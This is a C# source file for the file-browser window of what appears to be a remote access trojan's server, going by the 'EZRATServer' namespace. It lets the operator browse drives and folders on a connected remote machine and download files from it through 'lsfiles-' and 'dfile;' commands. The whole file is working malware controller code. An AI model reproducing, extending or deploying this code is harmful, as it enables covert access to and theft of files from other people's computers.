﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using EZRATServer.Network;

namespace EZRATServer
{
    public partial class FileBrowser : Form
    {

        private int _id;

        public int Id
        {
            get { return _id; }
            set { _id = value; }
        }

        private string _path;

        public string Path
        {
            get { return _path; }
            set { _path = value; }
        }

        private Server _parent;

        public Server BaseWindows
        {
            get { return _parent; }
            set { _parent = value; }
        }


        public enum FileType : int
        {
            File = 1,
            Folder = 2,
        }

        public FileBrowser(Server parent, int id)
        {
            InitializeComponent();

            this.BaseWindows = parent;
            this.cmbDrives.SelectedIndexChanged += UpdatePath;
            this.lstFiles.MouseDoubleClick += NewPath;
            this.downloadMenu.Click += DownloadFile;
            this.picUp.Click += UpPath;
        }

        private void DownloadFile(object sender,EventArgs e)
        {
            this.BaseWindows.SendCommand("dfile;" + this.lstFiles.Items[lstFiles.Items.IndexOf(lstFiles.SelectedItems[0])].Text, this.Id);
        }

        private void UpPath(object sender, EventArgs e)
        {
            Path = Path.TrimEnd('\\');
            string result = Path.Substring(0, Path.LastIndexOf('\\') + 1);
            NewPath(result);
        }

        private void NewPath(string path)
        {
            Path = path;
            this.lblPath.Text = Path;
            BaseWindows.SendCommand("lsfiles-" + Path, Id);
        }

        private void NewPath(object sender, EventArgs e)
        {
            string path = this.lstFiles.Items[lstFiles.Items.IndexOf(lstFiles.SelectedItems[0])].Text;
            Path += $@"{path}\";
            this.lblPath.Text = Path;
            BaseWindows.SendCommand("lsfiles-" + Path, Id);
        }

        public void UpdatePath(object sender, EventArgs e)
        {
            this.cmbDrives.Invoke(new MethodInvoker(() => Path = this.cmbDrives.Items[this.cmbDrives.SelectedIndex].ToString()));
            BaseWindows.SendCommand("lsfiles-" + Path, Id);
            this.lblPath.Text = Path;
        }


        public void UpdateDrives(string[] drives)
        {
            for (int i = 0; i < drives.Length; i++)
            {
                this.cmbDrives.Invoke(new MethodInvoker(() => this.cmbDrives.Items.Add(drives[i])));
            }
            this.cmbDrives.Invoke(new MethodInvoker(() => this.cmbDrives.SelectedIndex = 0));
            this.cmbDrives.Invoke(new MethodInvoker(() => Path = this.cmbDrives.Items[this.cmbDrives.SelectedIndex].ToString()));
            UpdatePath(new object(), new EventArgs());
        }

        public void Update(string list, char separator1 = '¦', char separator2 = '|')
        {
            ResetAll();
            // Tarte.cs¦File|Poulpe.cs¦File|
            StringBuilder sb = new StringBuilder(list);
            string name = string.Empty;
            for (int i = 0; i < sb.Length; i++)
            {
                if (sb[i] == separator1)
                {
                    if (sb[i + 1] == '1')
                    {
                        AddFileOrFolder(name, FileType.File);
                        name = string.Empty;
                        i += 3;
                    }
                    else
                    {
                        AddFileOrFolder(name, FileType.Folder);
                        name = string.Empty;
                        i += 3;
                    }
                }
                if (i <= sb.Length - 1)
                {
                    name += sb[i].ToString();
                }
            }

            lstFiles.Invoke(new MethodInvoker(() => lstFiles.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent)));

            lstFiles.Invoke(new MethodInvoker(() => lstFiles.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)));
        }

        private void AddFileOrFolder(string name, FileType type)
        {
            if (name.StartsWith("¦"))
            {
                name = name.Substring(3);
            }
            if (lstFiles.InvokeRequired)
            {

                lstFiles.Invoke(new MethodInvoker(() => lstFiles.Items.Add(new ListViewItem(new string[] { name, type.ToString() }))));

            }
            else
            {
                lstFiles.Items.Add(new ListViewItem(new string[] { name, type.ToString() }));
            }

        }

        private void ResetAll()
        {
            lstFiles.Invoke(new MethodInvoker(() => lstFiles.Items.Clear()));
        }
    }
}